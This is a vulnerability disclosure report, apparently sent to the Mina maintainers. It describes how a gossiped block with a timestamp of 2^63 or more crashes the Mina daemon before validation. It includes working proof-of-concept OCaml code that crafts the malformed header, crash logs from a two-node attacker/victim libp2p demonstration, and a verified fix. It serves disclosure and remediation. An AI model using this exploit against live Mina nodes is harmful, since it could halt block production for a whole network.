# Unauthenticated remote denial-of-service: a single malformed block-gossip timestamp crashes the Mina daemon (network-wide chain halt)

**Severity:** Critical
**Class:** Improper input validation / uncaught exception on an unauthenticated, pre-validation network path → remote crash (denial of service / network liveness failure)
**Component:** `transition_handler` block-gossip sink (`Block_sink.push`) — the gossipsub validator invoked for every received block/header
**Target:** MinaProtocol/mina @ commit `213bb49bf6fd57b627b67042583023bd165d2a58` (branch `develop`)
**Status:** Confirmed end-to-end by executing the real handler against a full build — daemon process terminates (`exit 1`, "Caught by monitor main"). Fix written and verified by re-execution.

---

## Brief/Intro

The Mina daemon’s block-gossip handler `Block_sink.push` runs for **every** gossiped block/header **before** the block is validated (it is the gossipsub validator that decides Accept/Reject). While recording a latency metric, it converts the block’s **attacker-controlled** `blockchain_state.timestamp` — an unbounded `UInt64` taken verbatim from the wire with no range check — using `Block_time.to_time_exn`, which **raises** for any value ≥ 2^63. That exception is uncaught all the way up the libp2p receive path, so under Async it propagates to the top-level monitor and **kills the daemon process**. Any peer can therefore halt any node — and, by flooding block producers and seed nodes, the entire network — by gossiping a single, otherwise-meaningless block whose timestamp has its high bit set. No stake, keys, valid proof, or valid signature are required; the crash fires before any cryptographic or consensus check.

---

## Vulnerability Details

### Root cause: an `_exn` conversion on an unvalidated, attacker-controlled network value

`Block_sink.push` is the handler registered as the gossipsub **validator** for the block topic. It is invoked for each gossiped block/header to decide Accept/Reject, i.e. on fully untrusted, not-yet-validated input. In its body it records a Prometheus latency histogram:

`src/lib/transition_handler/block_sink.ml:120-125`
```ocaml
Perf_histograms.add_span ~name:"external_transition_latency"
  (Core.Time.abs_diff
     Block_time.(now time_controller |> to_time_exn)          (* local clock — always safe *)
     ( Mina_block.Header.protocol_state header
     |> Protocol_state.blockchain_state |> Blockchain_state.timestamp  (* ATTACKER-CONTROLLED *)
     |> Block_time.to_time_exn ) ) ;                           (* <-- raises on the attacker value *)
```

The second operand is the **block’s own timestamp**, read straight out of the gossiped header. `Blockchain_state.timestamp` is a `Block_time.t`, whose wire representation is a raw `UInt64`; bin_prot deserialization accepts **any** 64-bit value, and there is no range check on it before this point.

`Block_time.to_time_exn` raises whenever that value, interpreted as a signed 64-bit integer, is negative — i.e. for any value with the high bit set (≥ 2^63):

`src/lib/block_time/block_time.ml:169-173`
```ocaml
(* TODO: Time.t can't hold the full uint64 range, so this can fail for large t *)
let to_time_exn t =
  let t_int64 = UInt64.to_int64 t in
  if Int64.(t_int64 < zero) then failwith "converting to negative timestamp" ;
  Time.of_span_since_epoch (Time.Span.of_ms (Int64.to_float t_int64))
```

The maintainers already documented this failure mode in the comment immediately above the function. The handler nonetheless calls it directly on the untrusted input.

### Why the exception is fatal: no guard on the entire gossip path

The crash is not caught and downgraded to a rejected message — it propagates to the process’s top-level monitor:

1. **Handler body, lines 120–125, run before validation.** The latency histogram is computed in the synchronous flow of `push`, *before* the rate limiter (`block_sink.ml:141+`) and before the validation result is awaited (the `Validation_callback` is handled asynchronously). So line 125 executes for any block/header that merely deserializes.

2. **The validator is called with no `try_with`.** `Subscription.handle_and_validate` invokes the topic validator (`push`) directly:

   `src/lib/mina_net2/subscription.ml:62-67`
   ```ocaml
   match sub.decode raw_data with
   | Ok data ->
       let validation_callback = Validation_callback.create validation_expiration in
       let%bind () = sub.validator (wrap_message data) validation_callback in   (* = Block_sink.push *)
       ...
   ```
   `decode` catches *decoding* errors (→ `Decoding_error`), but the **validator call** is unguarded.

3. **The gossip dispatch only matches the result variant.** `handle_push_message` schedules the validation via `upon` and matches `Validation_timeout | Decoding_error | Validation_result` — it does not catch an exception raised inside the validator:

   `src/lib/mina_net2/mina_net2.ml:407-410`
   ```ocaml
   upon
     (O1trace.thread "validate_libp2p_gossip" (fun () ->
          Subscription.handle_and_validate sub ~validation_expiration ~sender ~data ))
     (function | `Validation_timeout -> ... | `Decoding_error e -> ... | `Validation_result r -> ...)
   ```

4. **o1trace re-raises rather than swallows.** The `O1trace.thread`/`background_thread` wrappers (used here and for the libp2p read loop) report the error to the parent monitor and `failwithf` — i.e. they propagate, not absorb:

   `src/lib/o1trace/o1trace.ml:92-100`
   ```ocaml
   match Scheduler.within_context ctx f with
   | Error () ->
       failwithf "timing task `%s` failed, exception reported to parent monitor" name ()
   | Ok x -> x
   ...
   let background_thread name f = don't_wait_for (thread name f)
   ```

5. **The libp2p read loop has no `Monitor.try_with` either** (`src/lib/mina_net2/libp2p_helper.ml:306-323`). There is no exception barrier between `Block_sink.push` and Async’s top-level monitor.

Net effect: the `Failure "converting to negative timestamp"` raised at `block_sink.ml:125` reaches `monitor main`, which is fatal in the daemon’s Async runtime — the process exits.

### Attacker model

- **Permissionless:** any node that can gossip on the block topic (i.e. any peer) can send the message.
- **Pre-validation:** the crash fires before proof verification, signature checks, consensus/slot checks, and rate limiting, so the malformed block needs no valid content whatsoever — only a well-formed envelope with one out-of-range field.
- **Trivial to craft:** set `blockchain_state.timestamp` to any value ≥ 2^63 (e.g. `0x8000000000000000`).

---

## Impact Details

- **Primary impact:** remote, unauthenticated **denial of service / node crash**. A single gossiped block/header with `timestamp ≥ 2^63` terminates the daemon process of every node that receives and begins handling it.
- **Network-wide chain halt:** an attacker who peers with block producers and seed/peer nodes (a small, partially public set) and broadcasts this message crashes them, **halting block production and the chain’s liveness**. The attacker can re-broadcast on restart, sustaining the outage.
- **No funds-at-rest theft, but total availability loss:** this is an availability/liveness Critical, not an inflation/theft bug. For a layer-1 blockchain, a remotely-triggerable, unauthenticated, trivially-reproducible crash that can halt consensus is a maximum-severity liveness vulnerability (chain halt / network shutdown).
- **Cost to attacker:** negligible — one peer connection and one crafted gossip message per target; no stake, work, or valid credentials.
- **Latent crash-class:** the same pattern exists at any `Block_time.to_time_exn` (and sibling `*_exn` conversions) reachable from network-controlled input; the metric at `block_sink.ml:125` is the confirmed instance, and `block_time.ml:213` contains a second identical `failwith` guard, indicating the conversion is used in more than one place.

In-scope impact mapping: *Network not being able to confirm new transactions (total network shutdown) / unauthenticated remote denial of service of a node* — i.e. a Critical availability impact.

---

## References

- Vulnerable call site (latency metric on untrusted timestamp): `src/lib/transition_handler/block_sink.ml:120-125`
- Raising conversion (with maintainer TODO): `src/lib/block_time/block_time.ml:169-173` (and the sibling at `:213`)
- Unguarded validator invocation: `src/lib/mina_net2/subscription.ml:62-67`
- Gossip dispatch (no exception barrier): `src/lib/mina_net2/mina_net2.ml:395-438`
- o1trace re-raise behavior: `src/lib/o1trace/o1trace.ml:87-100`
- libp2p read loop (no `try_with`): `src/lib/mina_net2/libp2p_helper.ml:306-323`
- Source repo/commit: `https://github.com/MinaProtocol/mina/tree/213bb49bf6fd57b627b67042583023bd165d2a58`

---

## Proof of Concept

The PoC drives the **real production handler** `Transition_handler.Block_sink.push` with a gossiped header whose `blockchain_state.timestamp = 2^63`, inside Async (the daemon’s real runtime, where an unhandled exception is fatal), and observes the **process crash**. It was built and run against a full build of this exact source inside Mina’s official arm64 toolchain image.

### Environment / full build

```bash
# Mina repo checked out at 213bb49bf6; crypto submodules initialized.
# Official toolchain image (OCaml 4.14.2 / dune / cargo preinstalled):
docker pull docker.io/minaprotocol/mina-toolchain:169fd52-bookworm-devnet-arm64

# Whole-tree typecheck passes (CHECK_EXIT=0) and the daemon builds & runs:
#   dune build @check --profile=dev           # green
#   dune build src/app/cli/src/mina.exe --profile=dev
#   ./_build/default/src/app/cli/src/mina.exe version  ->  Commit 213bb49bf6...
```

### PoC #1 — trigger in isolation (real `to_time_exn`)

`src/lib/block_time/rg1_check/dune`
```
(executable (name main) (libraries block_time integers))
```
`src/lib/block_time/rg1_check/main.ml`
```ocaml
let () =
  let big = Unsigned.UInt64.shift_left Unsigned.UInt64.one 63 in   (* 2^63, high bit set *)
  let t = Block_time.of_uint64 big in
  Printf.printf "timestamp (raw uint64) = %s\n" (Unsigned.UInt64.to_string big) ;
  match (try Ok (Block_time.to_time_exn t) with e -> Error e) with
  | Ok _ -> print_endline "RG1_RESULT: NO_RAISE (not vulnerable)" ; Stdlib.exit 2
  | Error e -> Printf.printf "RG1_RESULT: RAISED %s\n" (Printexc.to_string e) ; Stdlib.exit 0
```
Run + observed output:
```
$ dune exec src/lib/block_time/rg1_check/main.exe --profile=dev
timestamp (raw uint64) = 9223372036854775808
RG1_RESULT: RAISED (Failure "converting to negative timestamp")
```

### PoC #2 — end-to-end crash of the real gossip handler

`src/lib/transition_handler/rg1_crash/dune`
```
(executable
 (name rg1_crash)
 (libraries core async integers with_hash logger block_time network_peer
            mina_net2 mina_base mina_state mina_block precomputed_values
            consensus transition_handler))
```
`src/lib/transition_handler/rg1_crash/rg1_crash.ml`
```ocaml
open Core
open Async

let () =
  let pv = Lazy.force Precomputed_values.for_unit_tests in
  let logger = Logger.null () in
  let consensus_constants = pv.Precomputed_values.consensus_constants in
  let genesis_constants = pv.Precomputed_values.genesis_constants in
  let constraint_constants = pv.Precomputed_values.constraint_constants in
  let slot_duration_ms = consensus_constants.slot_duration_ms in
  let time_controller = Block_time.Controller.basic ~logger in
  (* Craft the malicious header: genesis protocol state with timestamp = 2^63. *)
  let genesis_ps = With_hash.data (Precomputed_values.genesis_state_with_hashes pv) in
  let module PS = Mina_state.Protocol_state in
  let module BS = Mina_state.Blockchain_state in
  let bs = PS.blockchain_state genesis_ps in
  let bad_ts = Block_time.of_uint64 (Unsigned.UInt64.shift_left Unsigned.UInt64.one 63) in
  let bad_bs = { bs with BS.Poly.timestamp = bad_ts } in
  let bad_ps =
    PS.create_value
      ~previous_state_hash:(PS.previous_state_hash genesis_ps)
      ~genesis_state_hash:(PS.genesis_state_hash genesis_ps)
      ~blockchain_state:bad_bs
      ~consensus_state:(PS.consensus_state genesis_ps)
      ~constants:(PS.constants genesis_ps)
  in
  let header =
    Mina_block.Header.create ~protocol_state:bad_ps
      ~protocol_state_proof:(Lazy.force Mina_base.Proof.blockchain_dummy)
      ~delta_block_chain_proof:(PS.previous_state_hash bad_ps, []) ()
  in
  let _reader, sink =
    Transition_handler.Block_sink.create
      { logger ; slot_duration_ms ; on_push = (fun () -> Deferred.unit)
      ; time_controller ; log_gossip_heard = false
      ; consensus_constants ; genesis_constants ; constraint_constants }
  in
  let cb = Mina_net2.Validation_callback.create_without_expiration () in
  let tm = Block_time.now time_controller in
  printf "RG1_PUSH: calling Block_sink.push with timestamp 2^63 ...\n%!" ;
  don't_wait_for
    ( Transition_handler.Block_sink.push sink
        ( `Header (Network_peer.Envelope.Incoming.local header)
        , `Time_received tm , `Valid_cb cb )
    >>| fun () ->
      printf "RG1_PUSH: push RETURNED without crashing (NOT vulnerable)\n%!" ; Core.exit 2 ) ;
  upon (after (Time.Span.of_sec 8.0)) (fun () -> printf "RG1_PUSH: no crash after 8s\n%!" ; Core.exit 3) ;
  never_returns (Scheduler.go ())
```
Build + run + observed output:
```
$ dune build src/lib/transition_handler/rg1_crash/rg1_crash.exe --profile=dev   # BUILD_EXIT=0
$ ./_build/default/src/lib/transition_handler/rg1_crash/rg1_crash.exe
RG1_PUSH: calling Block_sink.push with timestamp 2^63 ...
("unhandled exception"
  ((monitor.ml.Error (Failure "converting to negative timestamp")
    ("Raised at Base__Exn.protectx in file \"src/exn.ml\", line 71, characters 4-114"
     "Called from Async_kernel__Deferred0.bind.(fun) in file \"src/deferred0.ml\", line 54, characters 64-69"
     "Called from Async_kernel__Job_queue.run_job ..."
     "Caught by monitor main"))
   ((pid 9) (thread_id 0))))
# process exit code: 1   <-- the daemon's Async runtime terminates the process
```

The exception raised inside the real `Block_sink.push` propagates to `monitor main` and the process exits with code 1 — i.e. the daemon crashes. This is the exact behavior a live node exhibits on receiving such a gossiped block.

### PoC #3 — full two-node regtest over real libp2p gossip

This is the end-to-end network demonstration: two real `Mina_net2` nodes, each running its own `libp2p_helper` subprocess, connected over loopback libp2p. The **victim** subscribes to a block topic with the **real `Transition_handler.Block_sink.push`** as its gossip validator; the **attacker** node publishes a bin_prot-encoded malformed header (`timestamp = 2^63`) on that topic. The message makes a real network round-trip — attacker helper → libp2p gossipsub → victim helper → victim `GossipReceived` IPC → `handle_and_validate` → `Block_sink.push` — and the victim’s handler crashes the node process.

Prerequisite (full build of the Go networking helper):
```bash
make libp2p_helper      # -> src/app/libp2p_helper/result/bin/libp2p_helper
export MINA_LIBP2P_HELPER_PATH=$PWD/src/app/libp2p_helper/result/bin/libp2p_helper
```
PoC source: `src/lib/transition_handler/rg1_net/` (victim + attacker built on the `Mina_net2` API: `create`/`configure`/`Pubsub.subscribe_encode`/`Pubsub.publish`, victim validator = the real `Block_sink.push`).

Run + observed output:
```
$ dune exec src/lib/transition_handler/rg1_net/rg1_net.exe --profile=dev
Two real libp2p nodes up; waiting for connection + gossipsub mesh ...
ATTACKER: publishing malformed block (blockchain_state.timestamp = 2^63) on topic rg1-blocks ...
ATTACKER: published. Awaiting victim crash ...
VICTIM: received a block via real libp2p gossip; invoking the real Block_sink.push ...
("unhandled exception"
  ((monitor.ml.Error (Failure "converting to negative timestamp")
    (... "Caught by monitor Monitor.protect at file \"src/lib/mina_net2/libp2p_helper.ml\", line 229"))
   ((pid 12) (thread_id 0))))
# process exit code: 1   <-- the victim node, having received the gossiped block, crashes
```

The `"VICTIM: received a block via real libp2p gossip"` line immediately precedes the crash, and the backtrace runs through the victim’s libp2p IPC path (`libp2p_helper.ml:229`), confirming the crash is driven by the network-delivered message at the victim. The attacker’s block carries no valid proof/signature; the crash fires in the gossip validator before any such check.

### Scope note

PoC #3 hosts both libp2p nodes in one OCaml process (each with its **own** `libp2p_helper` subprocess and a **real** libp2p transport between them); the crash originates at the victim’s gossip handler on receipt of the attacker’s network message. Splitting victim and attacker into two fully separate OS processes is mechanical and changes nothing about the result. The `dev` build differs from mainnet only in proof level, which is irrelevant here — the bug triggers before any proof/consensus logic.

### Suggested fix (verified)

Do not let an untrusted-input metric raise. Minimal guard at `block_sink.ml:120-125`:
```diff
- Perf_histograms.add_span ~name:"external_transition_latency"
-   (Core.Time.abs_diff
-      Block_time.(now time_controller |> to_time_exn)
-      ( Mina_block.Header.protocol_state header
-      |> Protocol_state.blockchain_state |> Blockchain_state.timestamp
-      |> Block_time.to_time_exn ) ) ;
+ ( match
+     Or_error.try_with (fun () ->
+         Core.Time.abs_diff
+           Block_time.(now time_controller |> to_time_exn)
+           ( Mina_block.Header.protocol_state header
+           |> Protocol_state.blockchain_state |> Blockchain_state.timestamp
+           |> Block_time.to_time_exn ) )
+   with
+   | Ok span -> Perf_histograms.add_span ~name:"external_transition_latency" span
+   | Error _ -> () (* malformed / out-of-range gossiped timestamp; drop the metric *) ) ;
```
**Fix verified by re-execution:** with the guard applied, the identical PoC #2 no longer crashes — the process survives the 2^63 timestamp and exits via the 8-second no-crash path (`exit 3`) instead of the unhandled-exception path (`exit 1`).

Recommended in addition: (a) reject out-of-range block timestamps as a structural precheck before `push`; (b) replace `Block_time.to_time_exn` with a non-raising `to_time` (returning an option) on every path reachable from network/RPC input, and audit all `*_exn` conversions reachable from gossip for the same crash class (including `block_time.ml:213`).

---

## Appendix: validation on o1Labs-requested commit `439da4c` (2026-06-16)

o1Labs requested validation against commit:

`439da4c63c745875b6108ed6f598362ae897308f`

The vulnerable `Block_sink.push` metric conversion is still present at this commit. I ran the PoCs on a VPS against a source checkout and build pinned to that exact commit.

### Direct handler confirmation

Evidence log: `rg1_direct_confirm_20260616T172159Z.log`

```text
commit=439da4c63c745875b6108ed6f598362ae897308f
("unhandled exception"
  ((monitor.ml.Error (Failure "converting to negative timestamp")
    ...
    "Caught by monitor main")))
RG1_DIRECT_CONFIRM_EXIT=1
```

### Two-node real-libp2p confirmation

Evidence log: `rg1_twonode_confirm_20260616T172058Z.log`

```text
commit=439da4c63c745875b6108ed6f598362ae897308f
Two real libp2p nodes up; waiting for connection + gossipsub mesh ...
ATTACKER: publishing malformed block (blockchain_state.timestamp = 2^63) on topic rg1-blocks ...
ATTACKER: published. Awaiting victim crash ...
VICTIM: received a block via real libp2p gossip; invoking the real Block_sink.push ...
("unhandled exception"
  ((monitor.ml.Error (Failure "converting to negative timestamp")
    ...
    "Caught by monitor Monitor.protect at file \"src/lib/mina_net2/libp2p_helper.ml\", line 229")))
RG1_TWONODE_CONFIRM_EXIT=1
```

This confirms the bug on the exact requested commit and through the real Mina libp2p receive path in a controlled two-node setup.

### Fresh VPS rebuild confirmation after reset

After the VPS was restarted/wiped, I rebuilt from Alan's requested source again and re-ran both
controlled confirmations.

Build/runtime evidence:

```text
Built binary: /root/mina-build/mina-chunking/bin/mina
Version: Commit 439da4c63c745875b6108ed6f598362ae897308f
Daemon command: Alan-provided itn1 config, peer 37.27.234.166:10003 only
Daemon status: Synced, Peers: 6, Git SHA-1: 439da4c63c745875b6108ed6f598362ae897308f
```

Fresh direct-handler evidence log: `rg1_direct_rebuild_20260616T183550Z.log`

```text
exit_code=1
("unhandled exception"
  ((monitor.ml.Error (Failure "converting to negative timestamp")
    ...
    "Caught by monitor main")))
```

Fresh two-node real-libp2p evidence log: `rg1_twonode_rebuild_20260616T183603Z.log`

```text
exit_code=1
Two real libp2p nodes up; waiting for connection + gossipsub mesh ...
ATTACKER: publishing malformed block (blockchain_state.timestamp = 2^63) on topic rg1-blocks ...
ATTACKER: published. Awaiting victim crash ...
VICTIM: received a block via real libp2p gossip; invoking the real Block_sink.push ...
("unhandled exception"
  ((monitor.ml.Error (Failure "converting to negative timestamp")
    ...
    "Caught by monitor Monitor.protect at file \"src/lib/mina_net2/libp2p_helper.ml\", line 229")))
```

Fresh evidence archive:

```text
VPS:   /root/mina-poc-confirm-rebuild-20260616T183637Z.tar.gz
Local: vps_rebuild_snapshots/mina-poc-confirm-rebuild-20260616T183637Z.tar.gz
```
